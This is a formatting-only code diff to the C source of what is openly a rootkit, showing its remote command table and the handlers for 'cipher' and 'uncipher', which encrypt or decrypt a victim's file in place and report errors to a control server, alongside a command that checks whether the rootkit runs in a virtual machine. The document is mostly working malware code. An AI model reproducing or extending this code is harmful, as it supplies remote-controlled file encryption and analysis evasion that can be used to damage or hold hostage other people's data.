@@ -79,8 +79,8 @@ static struct command rootkit_commands_array[] = {
       sysinfo_handler },
     { "is_in_vm", 8, "check if remote rootkit is running in vm", 40,
       is_in_vm_handler },
-    { "cipher", 6, "cipher the file in parameter", 29, cipher_handler},
-    { "uncipher", 8, "uncipher the file in parameter", 31, uncipher_handler},
+    { "cipher", 6, "cipher the file in parameter", 29, cipher_handler },
+    { "uncipher", 8, "uncipher the file in parameter", 31, uncipher_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -518,12 +518,12 @@ static int sysinfo_handler(char *args, enum Protocol protocol) {
     return 0;
 }
 
-static int cipher_handler(char *args, enum Protocol protocol){
+static int cipher_handler(char *args, enum Protocol protocol) {
     // Read file
     char *buffer = NULL;
     int result = 0;
 
-    if((result = _read_file(args, &buffer)) < 0)
+    if ((result = _read_file(args, &buffer)) < 0)
         goto end;
 
     // Cipher buffer
@@ -534,11 +534,11 @@ static int cipher_handler(char *args, enum Protocol protocol){
         goto end;
 
     // Write data into file
-    if((result = _write_file(args, encrypted_buffer, encrypted_len)) < 0)
+    if ((result = _write_file(args, encrypted_buffer, encrypted_len)) < 0)
         goto end;
 
 end:
-    if(result < 0){
+    if (result < 0) {
         send_to_server(protocol, "cipher: Error while ciphering file.");
         return result;
     }
@@ -547,12 +547,12 @@ end:
     return result;
 }
 
-static int uncipher_handler(char *args, enum Protocol protocol){
+static int uncipher_handler(char *args, enum Protocol protocol) {
     // Read file
     char *encrypted_buffer = NULL;
     int result = 0;
 
-    if((result = _read_file(args, &encrypted_buffer)) < 0)
+    if ((result = _read_file(args, &encrypted_buffer)) < 0)
         goto end;
 
     // Uncipher buffer
@@ -563,11 +563,11 @@ static int uncipher_handler(char *args, enum Protocol protocol){
         goto end;
 
     // Write data into file
-    if((result = _write_file(args, decrypted_buffer, decrypted_len)) < 0)
+    if ((result = _write_file(args, decrypted_buffer, decrypted_len)) < 0)
         goto end;
 
 end:
-    if(result < 0){
+    if (result < 0) {
         send_to_server(protocol, "cipher: Error while unciphering file.");
         return result;
     }
